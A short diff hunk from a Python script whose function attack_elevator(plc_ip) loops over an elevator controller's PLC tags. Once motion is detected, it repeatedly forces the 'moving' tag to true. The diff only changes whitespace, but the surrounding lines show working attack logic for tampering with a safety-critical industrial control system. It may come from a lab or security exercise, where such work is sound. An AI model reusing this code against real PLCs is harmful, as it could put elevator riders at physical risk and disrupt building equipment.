@@ -37,10 +37,9 @@ def attack_elevator(plc_ip):
         while True:
             try:
                 moving = read_plc_tag(plc, MOVING_TAG)
-                
                 if moving:
                     detected_moving = True
-                
+
                 if detected_moving:
                     # Once moving is detected as true, set it all the way to true
                     write_plc_tag(plc, MOVING_TAG, 1, 'BOOL')
